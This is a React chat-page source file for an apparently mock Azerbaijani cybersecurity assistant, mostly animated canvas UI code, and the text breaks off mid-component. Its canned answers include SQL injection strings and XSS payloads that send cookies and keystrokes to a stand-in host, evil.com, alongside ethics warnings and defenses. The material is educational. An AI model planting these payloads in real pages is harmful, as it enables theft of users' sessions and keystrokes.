/**
 * ARN AI — NEURAL CHAT INTERFACE v6.0
 * Ultra-cinematic chat page matching the Singularity Gateway aesthetic.
 * Procedural space canvas, holographic panels, morphing AI core,
 * electric arcs, cyberpunk HUD overlays.
 */

import { useState, useRef, useEffect, useCallback } from 'react'
import ReactMarkdown from 'react-markdown'
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter'
import { oneDark } from 'react-syntax-highlighter/dist/esm/styles/prism'

// ─────────────────────────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────────────────────────

interface Message {
  id: string
  role: 'user' | 'assistant'
  content: string
  timestamp: Date
}

interface ChatSession {
  id: string
  title: string
  messages: Message[]
  createdAt: Date
}

interface Star {
  x: number; y: number; z: number
  size: number; bright: number; twOff: number
  r: number; g: number; b: number
}

interface Particle {
  x: number; y: number; vx: number; vy: number
  life: number; max: number; size: number; hue: number
}

interface Arc {
  pts: [number, number][]; life: number; max: number
}

interface Shockwave {
  x: number; y: number; r: number; maxR: number; alpha: number
}

// ─────────────────────────────────────────────────────────────────────────────
//  Factory helpers
// ─────────────────────────────────────────────────────────────────────────────

function mkStar(w: number, h: number): Star {
  const palettes = [
    [255, 255, 255], [199, 210, 254], [191, 219, 254],
    [221, 214, 254], [252, 231, 243], [186, 230, 253],
  ]
  const c = palettes[Math.floor(Math.random() * palettes.length)]
  return {
    x: Math.random() * w, y: Math.random() * h,
    z: Math.random() * 3 + 0.3,
    size: Math.random() * 1.8 + 0.2,
    bright: Math.random() * 0.7 + 0.3,
    twOff: Math.random() * Math.PI * 2,
    r: c[0], g: c[1], b: c[2],
  }
}

function mkParticle(cx: number, cy: number): Particle {
  const angle = Math.random() * Math.PI * 2
  const dist = Math.random() * 250 + 30
  return {
    x: cx + Math.cos(angle) * dist,
    y: cy + Math.sin(angle) * dist,
    vx: (Math.random() - 0.5) * 0.4,
    vy: (Math.random() - 0.5) * 0.4,
    life: Math.random() * 200,
    max: Math.random() * 300 + 150,
    size: Math.random() * 2 + 0.3,
    hue: Math.random() * 80 + 210,
  }
}

function mkArc(cx: number, cy: number): Arc {
  const pts: [number, number][] = [[cx, cy]]
  const a = Math.random() * Math.PI * 2
  let x = cx, y = cy
  for (let i = 0; i < 7; i++) {
    const da = (Math.random() - 0.5) * 1.4
    const step = 15 + Math.random() * 25
    x += Math.cos(a + da * i) * step
    y += Math.sin(a + da * i) * step
    pts.push([x, y])
  }
  return { pts, life: 0, max: Math.random() * 35 + 10 }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Mock AI responses
// ─────────────────────────────────────────────────────────────────────────────

const MOCK_RESPONSES: Record<string, string> = {
  'nmap': `# Nmap ilə Port Scan

**Nmap** (Network Mapper) — şəbəkə kəşfi və təhlükəsizlik auditi üçün istifadə olunan açıq mənbəli alətdir.

## Əsas Scan Növləri

### 1. TCP SYN Scan (Yarı-açıq scan)
\`\`\`bash
sudo nmap -sS -p 1-65535 target_ip
\`\`\`

### 2. Service Version Detection
\`\`\`bash
nmap -sV -sC target_ip
\`\`\`

### 3. OS Detection
\`\`\`bash
sudo nmap -O --osscan-guess target_ip
\`\`\`

### 4. Aggressive Scan
\`\`\`bash
nmap -A -T4 target_ip
\`\`\`

## Nəticələrin Analizi

| Port | Service | Risk |
|------|---------|------|
| 22   | SSH     | Orta |
| 80   | HTTP    | Yüksək |
| 443  | HTTPS   | Aşağı |

> ⚠️ **Xəbərdarlıq:** Yalnız icazəli sistemlər üzərində test aparın. İcazəsiz scan qanunsuzdur.

**Tövsiyə:** Həmişə \`--script vuln\` parametrindən istifadə edərək zəiflik yoxlaması aparın.`,

  'sql': `# SQL Injection Nədir?

**SQL Injection** (SQLi) — veb tətbiqlərdə verilənlər bazasına müdaxilə etməyə imkan verən kritik zəiflikdir.

## Hücum Növləri

### 1. Classic Union-Based
\`\`\`sql
' UNION SELECT username, password FROM users--
\`\`\`

### 2. Boolean-Based Blind
\`\`\`sql
' AND 1=1--    → true
' AND 1=2--    → false
\`\`\`

### 3. Time-Based Blind
\`\`\`sql
' AND SLEEP(5)--
\`\`\`

### 4. Error-Based
\`\`\`sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
\`\`\`

## Müdafiə Yolları

1. **Prepared Statements** istifadə edin:
\`\`\`python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
\`\`\`

2. **ORM** istifadə edin (SQLAlchemy, Django ORM)
3. **WAF** (Web Application Firewall) quraşdırın
4. **Input Validation** tətbiq edin

> 💡 **Qızıl qayda:** Heç vaxt istifadəçi inputunu birbaşa SQL sorğusuna daxil etməyin!`,

  'burp': `# Burp Suite ilə Web Test

**Burp Suite** — veb tətbiqlərin təhlükəsizlik testləri üçün ən populyar alətdir.

## Əsas Modullar

### 1. Proxy (Intercept)
\`\`\`
Browser → Burp Proxy (127.0.0.1:8080) → Target Server
\`\`\`
Bütün HTTP/HTTPS trafikini kəsib analiz edin.

### 2. Repeater
Sorğuları manual olaraq dəyişdirib yenidən göndərin:
\`\`\`http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=' OR '1'='1
\`\`\`

### 3. Intruder (Brute Force)
\`\`\`
Attack Type: Sniper
Payload: /usr/share/wordlists/rockyou.txt
Target Parameter: §password§
\`\`\`

### 4. Scanner (Pro)
- Avtomatik zəiflik aşkarlama
- OWASP Top 10 yoxlama
- Ətraflı hesabat

## Praktik Addımlar

1. **FoxyProxy** ilə brauzeri konfiqurasiya edin
2. Burp CA sertifikatını quraşdırın
3. **Scope** təyin edin — yalnız hədəf domenlər
4. **Sitemap** yaradın
5. Hər endpoint-i manual test edin

> 🔒 **Etik hacking:** Yalnız bug bounty proqramlarında və ya yazılı icazə ilə test aparın.`,

  'xss': `# XSS (Cross-Site Scripting) Hücumu

**XSS** — istifadəçinin brauzerində zərərli JavaScript kodu icra etməyə imkan verən zəiflikdir.

## XSS Növləri

### 1. Reflected XSS
\`\`\`html
https://target.com/search?q=<script>alert('XSS')</script>
\`\`\`

### 2. Stored XSS
\`\`\`javascript
// Foruma yazılan zərərli şərh
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
\`\`\`

### 3. DOM-Based XSS
\`\`\`javascript
// Zəif kod
document.getElementById('output').innerHTML = location.hash.slice(1)

// Exploit
https://target.com/#<img src=x onerror=alert(1)>
\`\`\`

## Advanced Payloads

\`\`\`javascript
// Cookie stealing
<script>
new Image().src='https://evil.com/log?c='+btoa(document.cookie)
</script>

// Keylogger injection
<script>
document.onkeypress=e=>
  fetch('https://evil.com/k?'+e.key)
</script>
\`\`\`

## Müdafiə

1. **Output Encoding** — HTML, JS, URL encoding
2. **CSP** (Content Security Policy) header:
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\`
3. **HttpOnly** cookie flag
4. **DOMPurify** kitabxanası istifadə edin

> ⚡ XSS OWASP Top 10 siyahısında **#3** yerdədir.`,
}

const DEFAULT_RESPONSE = `## Neural Cavab

Sualınız qeydə alındı. Mən **ARN AI** kibertəhlükəsizlik assistantıyam.

Aşağıdakı mövzularda sizə kömək edə bilərəm:

- 🔍 **Penetration Testing** — Nmap, Metasploit, Burp Suite
- 💉 **Web Zəiflikləri** — SQL Injection, XSS, CSRF
- 🛡️ **Müdafiə** — Firewall, IDS/IPS, WAF
- 🔐 **Kriptoqrafiya** — Şifrələmə, Hash, PKI
- 📡 **Şəbəkə Təhlükəsizliyi** — VPN, TLS, Wi-Fi hacking

\`\`\`bash
# Başlamaq üçün nümunə əmr:
nmap -sV -sC -O target_ip
\`\`\`

> 💡 Daha ətraflı cavab üçün konkret mövzu seçin.`

function getAIResponse(input: string): string {
  const lower = input.toLowerCase()
  if (lower.includes('nmap') || lower.includes('port scan') || lower.includes('port')) return MOCK_RESPONSES['nmap']
  if (lower.includes('sql') || lower.includes('injection')) return MOCK_RESPONSES['sql']
  if (lower.includes('burp') || lower.includes('web test')) return MOCK_RESPONSES['burp']
  if (lower.includes('xss') || lower.includes('cross-site') || lower.includes('script')) return MOCK_RESPONSES['xss']
  return DEFAULT_RESPONSE
}

// ─────────────────────────────────────────────────────────────────────────────
//  Suggestions
// ─────────────────────────────────────────────────────────────────────────────

const SUGGESTIONS = [
  'Nmap ilə port scan necə aparılır?',
  'SQL injection nədir?',
  'Burp Suite ilə web test',
  'XSS hücumu nədir?',
]

// ─────────────────────────────────────────────────────────────────────────────
//  Code Block
// ─────────────────────────────────────────────────────────────────────────────

const CodeBlock = ({ language, value }: { language: string; value: string }) => {
  const [copied, setCopied] = useState(false)
  const handleCopy = () => {
    navigator.clipboard.writeText(value)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }
  return (
    <div style={{
      borderRadius: 10, overflow: 'hidden', margin: '12px 0',
      border: '1px solid rgba(99,102,241,0.3)',
      background: 'rgba(0,0,0,0.5)',
    }}>
      <div style={{
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        padding: '6px 14px',
        background: 'rgba(99,102,241,0.08)',
        borderBottom: '1px solid rgba(99,102,241,0.2)',
      }}>
        <span style={{
          fontFamily: "'Space Mono', monospace", fontSize: 9,
          color: '#818cf8', letterSpacing: 2,
        }}>
          // {language || 'code'}
        </span>
        <button onClick={handleCopy} style={{
          fontFamily: "'Space Mono', monospace", fontSize: 9, letterSpacing: 2,
          padding: '3px 10px', borderRadius: 6, cursor: 'pointer',
          background: copied ? 'rgba(74,222,128,0.12)' : 'rgba(99,102,241,0.12)',
          color: copied ? '#4ade80' : '#818cf8',
          border: `1px solid ${copied ? 'rgba(74,222,128,0.3)' : 'rgba(99,102,241,0.3)'}`,
          transition: 'all 0.2s',
        }}>
          {copied ? '✓ KOPYALANDI' : 'KOPYALA'}
        </button>
      </div>
      <SyntaxHighlighter
        language={language || 'bash'}
        style={oneDark}
        customStyle={{ margin: 0, padding: '14px', background: 'transparent', fontSize: '0.8rem', lineHeight: 1.65 }}
      >
        {value}
      </SyntaxHighlighter>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
//  Markdown Renderer
// ─────────────────────────────────────────────────────────────────────────────

const MarkdownMessage = ({ content }: { content: string }) => (
  <ReactMarkdown
    components={{
      code({ className, children, ...props }) {
        const match = /language-(\w+)/.exec(className || '')
        return match ? (
          <CodeBlock language={match[1]} value={String(children).replace(/\n$/, '')} />
        ) : (
          <code style={{
            background: 'rgba(99,102,241,0.15)', color: '#a5b4fc',
            fontFamily: "'Space Mono', monospace", fontSize: '0.8rem',
            padding: '2px 6px', borderRadius: 4,
          }} {...props}>{children}</code>
        )
      },
      h1: ({ children }) => <h1 style={{ fontSize: '1.25rem', fontWeight: 700, color: '#e2e8f0', margin: '1rem 0 0.5rem', letterSpacing: '-0.02em' }}>{children}</h1>,
      h2: ({ children }) => <h2 style={{ fontSize: '1.05rem', fontWeight: 700, color: '#e2e8f0', margin: '0.9rem 0 0.4rem' }}>{children}</h2>,
      h3: ({ children }) => <h3 style={{ fontSize: '0.95rem', fontWeight: 600, color: '#a5b4fc', margin: '0.8rem 0 0.35rem' }}>{children}</h3>,
      p: ({ children }) => <p style={{ marginBottom: '0.65rem', lineHeight: 1.75, color: '#cbd5e1', fontSize: '0.92rem' }}>{children}</p>,
      ul: ({ children }) => <ul style={{ marginBottom: '0.7rem', paddingLeft: '1.2rem' }}>{children}</ul>,
      ol: ({ children }) => <ol style={{ marginBottom: '0.7rem', paddingLeft: '1.2rem', listStyleType: 'decimal' }}>{children}</ol>,
      li: ({ children }) => <li style={{ color: '#cbd5e1', lineHeight: 1.7, fontSize: '0.92rem', marginBottom: '0.2rem', listStyleType: 'disc' }}>{children}</li>,
      strong: ({ children }) => <strong style={{ fontWeight: 700, color: '#e2e8f0' }}>{children}</strong>,
      blockquote: ({ children }) => (
        <blockquote style={{
          borderLeft: '2px solid #818cf8', color: '#94a3b8',
          background: 'rgba(99,102,241,0.06)', padding: '6px 12px',
          borderRadius: '0 6px 6px 0', margin: '8px 0', fontSize: '0.9rem',
        }}>{children}</blockquote>
      ),
      hr: () => <hr style={{ borderColor: 'rgba(99,102,241,0.2)', margin: '10px 0' }} />,
    }}
  >
    {content}
  </ReactMarkdown>
)

// ─────────────────────────────────────────────────────────────────────────────
//  Thinking Animation
// ─────────────────────────────────────────────────────────────────────────────

const ThinkingDots = () => (
  <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '8px 0' }}>
    <span style={{ fontFamily: "'Space Mono', monospace", fontSize: 9, color: 'rgba(129,140,248,0.5)', letterSpacing: 2 }}>
      // neural.processing
    </span>
    {[0, 1, 2].map(i => (
      <div key={i} style={{
        width: 5, height: 5, borderRadius: '50%',
        background: '#818cf8',
        animation: `neuralPulse 1.2s ease-in-out ${i * 0.2}s infinite`,
        boxShadow: '0 0 6px #818cf8',
      }} />
    ))}
  </div>
)

// ─────────────────────────────────────────────────────────────────────────────
//  Corner decoration (from LandingPage)
// ─────────────────────────────────────────────────────────────────────────────

function CornerDecor({ accent }: { accent: string }) {
  const corner: React.CSSProperties = {
    position: 'absolute', width: 10, height: 10,
    borderColor: accent, borderStyle: 'solid', opacity: 0.5,
  }
  return (
    <>
      <div style={{ ...corner, top: 8, left: 8, borderWidth: '1px 0 0 1px' }} />
      <div style={{ ...corner, top: 8, right: 8, borderWidth: '1px 1px 0 0' }} />
      <div style={{ ...corner, bottom: 8, left: 8, borderWidth: '0 0 1px 1px' }} />
      <div style={{ ...corner, bottom: 8, right: 8, borderWidth: '0 1px 1px 0' }} />
    </>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
//  Main Component
// ─────────────────────────────────────────────────────────────────────────────

export default function ChatPage() {
  const [input, setInput] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [chats, setChats] = useState<ChatSession[]>([])
  const [currentChatId, setCurrentChatId] = useState<string | null>(null)
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const textareaRef = useRef<HTMLTextAreaElement>(null)

  // Canvas refs
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const rafRef = useRef(0)
  const tickRef = useRef(0)
  const mouseRef = useRef({ x: 0.5, y: 0.5 })
  const starsRef = useRef<Star[]>([])
  const particlesRef = useRef<Particle[]>([])
  const arcsRef = useRef<Arc[]>([])
  const clickFX = useRef<Shockwave[]>([])

  const currentChat = chats.find(c => c.id === currentChatId) || null

  // ── Initialize first chat ──────────────────────────────────────────────
  useEffect(() => {
    const id = Date.now().toString()
    const newChat: ChatSession = {
      id, title: 'Yeni Söhbət', messages: [], createdAt: new Date()
    }
    setChats([newChat])
    setCurrentChatId(id)
  }, [])

  // ── Scroll to bottom on new messages ───────────────────────────────────
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [currentChat?.messages])

  // ── Auto-resize textarea ───────────────────────────────────────────────
  useEffect(() => {
    const ta = textareaRef.current
    if (!ta) return
    ta.style.height = 'auto'
    ta.style.height = Math.min(ta.scrollHeight, 128) + 'px'
  }, [input])

  // ── Canvas seed ────────────────────────────────────────────────────────
  useEffect(() => {
    const w = window.innerWidth, h = window.innerHeight
    starsRef.current = Array.from({ length: 500 }, () => mkStar(w, h))
    particlesRef.current = Array.from({ length: 30 }, () => mkParticle(w / 2, h / 2))
  }, [])

  // ── Canvas render loop ────────────────────────────────────────────────
  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')!

    const resize = () => {
      canvas.width = window.innerWidth
      canvas.height = window.innerHeight
    }
    resize()
    window.addEventListener('resize', resize)

    const draw = () => {
      rafRef.current = requestAnimationFrame(draw)
      const w = canvas.width, h = canvas.height
      const cx = w / 2, cy = h / 2
      tickRef.current += 0.008
      const t = tickRef.current
      const mx = mouseRef.current.x
      const my = mouseRef.current.y

      // Background with trail
      ctx.fillStyle = 'rgba(1,1,12,0.25)'
      ctx.fillRect(0, 0, w, h)

      // Deep space nebulae
      const nebs = [
        { dx: -0.3, dy: -0.2, r: 0.45, hue: 241, a: 0.04 },
        { dx: 0.25, dy: 0.15, r: 0.35, hue: 270, a: 0.035 },
        { dx: 0.0, dy: -0.3, r: 0.28, hue: 195, a: 0.03 },
      ]
      nebs.forEach(n => {
        const px = (mx - 0.5) * 12, py = (my - 0.5) * 12
        const nx = cx + n.dx * w + px
        const ny = cy + n.dy * h + py
        const nr = n.r * w
        const g = ctx.createRadialGradient(nx, ny, 0, nx, ny, nr)
        g.addColorStop(0, `hsla(${n.hue},75%,55%,${n.a})`)
        g.addColorStop(0.5, `hsla(${n.hue},65%,45%,${n.a * 0.4})`)
        g.addColorStop(1, 'rgba(0,0,0,0)')
        ctx.fillStyle = g
        ctx.fillRect(0, 0, w, h)
      })

      // Stars
      starsRef.current.forEach(s => {
        const px = (mx - 0.5) * s.z * 20
        const py = (my - 0.5) * s.z * 20
        const tw = 0.65 + Math.sin(t * 1.8 + s.twOff) * 0.35
        const alpha = s.bright * tw
        const sx = s.x + px, sy = s.y + py
        ctx.globalAlpha = alpha * 0.7
        ctx.fillStyle = `rgb(${s.r},${s.g},${s.b})`
        ctx.beginPath()
        ctx.arc(sx, sy, s.size * tw, 0, Math.PI * 2)
        ctx.fill()
        if (s.size > 1.4) {
          const halo = ctx.createRadialGradient(sx, sy, 0, sx, sy, s.size * 3.5)
          halo.addColorStop(0, `rgba(${s.r},${s.g},${s.b},${alpha * 0.2})`)
          halo.addColorStop(1, 'rgba(0,0,0,0)')
          ctx.fillStyle = halo
          ctx.beginPath()
          ctx.arc(sx, sy, s.size * 3.5, 0, Math.PI * 2)
          ctx.fill()
        }
      })
      ctx.globalAlpha = 1

      // Ambient particles
      particlesRef.current.forEach(p => {
        const dx = cx + (mx - 0.5) * 40 - p.x
        const dy = cy + (my - 0.5) * 40 - p.y
        const dist = Math.sqrt(dx * dx + dy * dy) || 1
        p.vx += dx / dist * 0.001
        p.vy += dy / dist * 0.001
        p.vx *= 0.985
        p.vy *= 0.985
        p.x += p.vx
        p.y += p.vy
        p.life++
        if (p.life >= p.max) Object.assign(p, mkParticle(cx, cy))
        const prog = p.life / p.max
        const pa = Math.sin(prog * Math.PI) * 0.4
        ctx.beginPath()
        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2)
        ctx.fillStyle = `hsla(${p.hue},75%,70%,${pa})`
        ctx.fill()
      })

      // Electric arcs
      if (Math.random() < 0.02 && arcsRef.current.length < 5) {
        const ax = Math.random() * w
        const ay = Math.random() * h
        arcsRef.current.push(mkArc(ax, ay))
      }
      arcsRef.current = arcsRef.current.filter(a => a.life < a.max)
      ctx.save()
      ctx.shadowBlur = 4
      ctx.shadowColor = '#c7d2fe'
      arcsRef.current.forEach(arc => {
        arc.life++
        const progress = arc.life / arc.max
        const aAlpha = Math.sin(progress * Math.PI) * 0.4
        ctx.strokeStyle = `rgba(199,210,254,${aAlpha})`
        ctx.lineWidth = 0.4
        ctx.beginPath()
        arc.pts.forEach(([x, y], i) => {
          if (i === 0) ctx.moveTo(x, y)
          else ctx.lineTo(x, y)
        })
        ctx.stroke()
      })
      ctx.restore()

      // Shockwaves
      clickFX.current = clickFX.current.filter(s => s.alpha > 0.008)
      clickFX.current.forEach(s => {
        s.r += (s.maxR - s.r) * 0.09
        s.alpha *= 0.92
        for (let ring = 0; ring < 3; ring++) {
          const rr = s.r - ring * 15
          if (rr < 0) continue
          ctx.beginPath()
          ctx.arc(s.x, s.y, rr, 0, Math.PI * 2)
          ctx.strokeStyle = `rgba(99,102,241,${s.alpha * (1 - ring * 0.25)})`
          ctx.lineWidth = 1.2 - ring * 0.3
          ctx.stroke()
        }
      })

      // Subtle vignette
      const vig = ctx.createRadialGradient(cx, cy, h * 0.3, cx, cy, h * 1.1)
      vig.addColorStop(0, 'rgba(0,0,0,0)')
      vig.addColorStop(1, 'rgba(0,0,8,0.55)')
      ctx.fillStyle = vig
      ctx.fillRect(0, 0, w, h)
    }

    draw()
    return () => {
      cancelAnimationFrame(rafRef.current)
      window.removeEventListener('resize', resize)
    }
  }, [])

  // ── Mouse tracking ─────────────────────────────────────────────────────
  useEffect(() => {
    const onMove = (e: MouseEvent) => {
      mouseRef.current.x = e.clientX / window.innerWidth
      mouseRef.current.y = e.clientY / window.innerHeight
    }
    window.addEventListener('mousemove', onMove)
    return () => window.removeEventListener('mousemove', onMove)
  }, [])

  // ── Click shockwave ────────────────────────────────────────────────────
  const onBgClick = useCallback((e: React.MouseEvent) => {
    clickFX.current.push({ x: e.clientX, y: e.clientY, r: 4, maxR: 160, alpha: 0.7 })
    if (clickFX.current.length > 8) clickFX.current.shift()
  }, [])

  // ── Create new chat ────────────────────────────────────────────────────
  const createNewChat = () => {
    const id = Date.now().toString()
    const newChat: ChatSession = {
      id, title: 'Yeni Söhbət', messages: [], createdAt: new Date()
    }
    setChats(prev => [newChat, ...prev])
    setCurrentChatId(id)
    setSidebarOpen(false)
  }

  // ── Delete chat ────────────────────────────────────────────────────────
  const deleteChat = (id: string) => {
    setChats(prev => {
      const updated = prev.filter(c => c.id !== id)
      if (currentChatId === id) {
        if (updated.length > 0) {
          setCurrentChatId(updated[0].id)
        } else {
          const newId = Date.now().toString()
          const newChat: ChatSession = { id: newId, title: 'Yeni Söhbət', messages: [], createdAt: new Date() }
          setCurrentChatId(newId)
          return [newChat]
        }
      }
      return updated
    })
  }

  // ── Send message ───────────────────────────────────────────────────────
  const handleSend = async () => {
    if (!input.trim() || isLoading) return

    let chatId = currentChatId
    if (!chatId) {
      const id = Date.now().toString()
      const newChat: ChatSession = { id, title: 'Yeni Söhbət', messages: [], createdAt: new Date() }
      setChats(prev => [newChat, ...prev])
      chatId = id
      setCurrentChatId(id)
    }

    const userMessage: Message = {
      id: Date.now().toString(),
      role: 'user',
      content: input.trim(),
      timestamp: new Date()
    }

    const userInput = input.trim()
    setInput('')
    setIsLoading(true)

    // Add user message
    setChats(prev => prev.map(c =>
      c.id !== chatId ? c : {
        ...c,
        title: c.messages.length === 0 ? userInput.slice(0, 30) + (userInput.length > 30 ? '...' : '') : c.title,
        messages: [...c.messages, userMessage]
      }
    ))

    // Add empty assistant message
    const assistantId = (Date.now() + 1).toString()
    const assistantMessage: Message = {
      id: assistantId,
      role: 'assistant',
      content: '',
      timestamp: new Date()
    }

    setChats(prev => prev.map(c =>
      c.id !== chatId ? c : { ...c, messages: [...c.messages, assistantMessage] }
    ))

    // Simulate streaming response
    const fullResponse = getAIResponse(userInput)
    const chars = fullResponse.split('')
    let accumulated = ''

    for (let i = 0; i < chars.length; i++) {
      accumulated += chars[i]
      const content = accumulated
      setChats(prev => prev.map(c =>
        c.id !== chatId ? c : {
          ...c,
          messages: c.messages.map(m =>
            m.id === assistantId ? { ...m, content } : m
          )
        }
      ))
      // Variable speed: faster for spaces and common chars
      const delay = chars[i] === ' ' ? 3 : chars[i] === '\n' ? 15 : 5
      await new Promise(r => setTimeout(r, delay))
    }

    setIsLoading(false)
  }

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleSend() }
  }

  const tokenUsed = currentChat?.messages.filter(m => m.role === 'user').length || 0
  const tokenLimit = 50
  const tokenPct = Math.min((tokenUsed / tokenLimit) * 100, 100)

  return (
    <div
      style={{
        position: 'fixed', inset: 0, background: '#01010c',
        overflow: 'hidden', fontFamily: "'Space Mono', monospace",
        display: 'flex',
      }}
      onClick={onBgClick}
    >
      {/* ── Keyframes ────────────────────────────────────────────────── */}
      <style>{`
        @keyframes neuralPulse {
          0%, 100% { opacity: 0.3; transform: scale(0.8); }
          50% { opacity: 1; transform: scale(1.2); }
        }
        @keyframes fadeSlideIn {
          from { opacity: 0; transform: translateY(12px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(24px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes scanH {
          from { transform: translateX(-150%); }
          to { transform: translateX(500%); }
        }
        @keyframes corePulse {
          0%, 100% { box-shadow: 0 0 12px rgba(99,102,241,0.4), 0 0 24px rgba(99,102,241,0.15); }
          50% { box-shadow: 0 0 25px rgba(99,102,241,0.7), 0 0 50px rgba(99,102,241,0.25); }
        }
        @keyframes borderPulse {
          0%,100% { opacity: 0.35; }
          50% { opacity: 0.9; }
        }
        @keyframes logoPulse {
          0%,100% { box-shadow: 0 0 18px rgba(99,102,241,0.45); }
          50% { box-shadow: 0 0 35px rgba(99,102,241,0.8), 0 0 60px rgba(99,102,241,0.25); }
        }
        @keyframes statusBlink {
          0%,100% { opacity: 1; }
          50% { opacity: 0.35; }
        }
        @keyframes shimmer {
          from { background-position: 200% 0; }
          to { background-position: -200% 0; }
        }
        @keyframes sidebarSlideIn {
          from { transform: translateX(-100%); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        @keyframes panelReveal {
          from { opacity: 0; transform: scale(0.95) translateY(8px); }
          to { opacity: 1; transform: scale(1) translateY(0); }
        }
        @keyframes msgAppear {
          from { opacity: 0; transform: translateY(8px) scale(0.98); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes glowRing {
          0%,100% { box-shadow: 0 0 8px rgba(99,102,241,0.3); }
          50% { box-shadow: 0 0 20px rgba(99,102,241,0.6), 0 0 40px rgba(99,102,241,0.2); }
        }
        @keyframes typingCursor {
          0%,100% { border-color: #818cf8; }
          50% { border-color: transparent; }
        }
        @keyframes floatUp {
          0% { transform: translateY(0) scale(1); opacity: 0.6; }
          100% { transform: translateY(-30px) scale(0.5); opacity: 0; }
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        .msg-appear { animation: msgAppear 0.4s cubic-bezier(0.16,1,0.3,1) both; }
        textarea::placeholder {
          color: rgba(148,163,184,0.35);
          font-family: 'Space Mono', monospace;
          font-size: 11px;
          letter-spacing: 1px;
        }
        textarea { scrollbar-width: none; }
        textarea::-webkit-scrollbar { display: none; }
        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(99,102,241,0.2); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(99,102,241,0.4); }
      `}</style>

      {/* ── 3D Space Canvas ──────────────────────────────────────────── */}
      <canvas
        ref={canvasRef}
        style={{ position: 'absolute', inset: 0, zIndex: 0 }}
      />

      {/* ── Scanlines ────────────────────────────────────────────────── */}
      <div style={{
        position: 'absolute', inset: 0, zIndex: 1, pointerEvents: 'none',
        backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,200,180,0.005) 3px, rgba(0,200,180,0.005) 4px)',
      }} />

      {/* ── Chromatic aberration ─────────────────────────────────────── */}
      <div style={{
        position: 'absolute', inset: 0, zIndex: 1, pointerEvents: 'none',
        backgroundImage: 'linear-gradient(90deg, rgba(255,0,128,0.008) 0%, transparent 30%, transparent 70%, rgba(0,255,255,0.008) 100%)',
      }} />

      {/* ══════════════════════════════════════════════════════════════════
          SIDEBAR
      ══════════════════════════════════════════════════════════════════ */}

      {/* Mobile sidebar overlay */}
      {sidebarOpen && (
        <div
          style={{
            position: 'fixed', inset: 0, zIndex: 80,
            background: 'rgba(1,1,12,0.6)',
            backdropFilter: 'blur(4px)',
          }}
          onClick={() => setSidebarOpen(false)}
        />
      )}

      {/* Sidebar panel */}
      <div
        onClick={e => e.stopPropagation()}
        style={{
          position: 'fixed', top: 0, left: 0, bottom: 0,
          width: 300, zIndex: 90,
          background: 'rgba(2,2,16,0.96)',
          borderRight: '1px solid rgba(99,102,241,0.15)',
          backdropFilter: 'blur(30px)',
          display: 'flex', flexDirection: 'column',
          transform: sidebarOpen ? 'translateX(0)' : 'translateX(-100%)',
          transition: 'transform 0.4s cubic-bezier(0.16,1,0.3,1)',
          overflow: 'hidden',
        }}
      >
        {/* Sidebar corner decor */}
        <CornerDecor accent="#818cf8" />

        {/* Sidebar header */}
        <div style={{
          padding: '20px 20px 16px',
          borderBottom: '1px solid rgba(99,102,241,0.12)',
        }}>
          <div style={{
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            marginBottom: 16,
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{
                width: 32, height: 32, borderRadius: 9,
                background: 'linear-gradient(135deg, #6366f1, #9333ea)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                boxShadow: '0 0 18px rgba(99,102,241,0.5)',
                animation: 'logoPulse 2.5s ease-in-out infinite',
              }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round">
                  <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
                </svg>
              </div>
              <span style={{
                fontSize: 14, fontWeight: 700, letterSpacing: 3,
                background: 'linear-gradient(135deg, #818cf8, #c084fc)',
                WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent',
              }}>
                ARN AI
              </span>
            </div>
            <button
              onClick={() => setSidebarOpen(false)}
              style={{
                background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)',
                color: 'rgba(255,255,255,0.4)', width: 28, height: 28, borderRadius: 6,
                cursor: 'pointer', fontSize: 10, display: 'flex',
                alignItems: 'center', justifyContent: 'center',
                transition: 'all 0.2s',
              }}
              onMouseEnter={e => { e.currentTarget.style.background = 'rgba(255,80,80,0.12)'; e.currentTarget.style.borderColor = 'rgba(255,80,80,0.4)' }}
              onMouseLeave={e => { e.currentTarget.style.background = 'rgba(255,255,255,0.04)'; e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)' }}
            >✕</button>
          </div>

          {/* New chat button */}
          <button
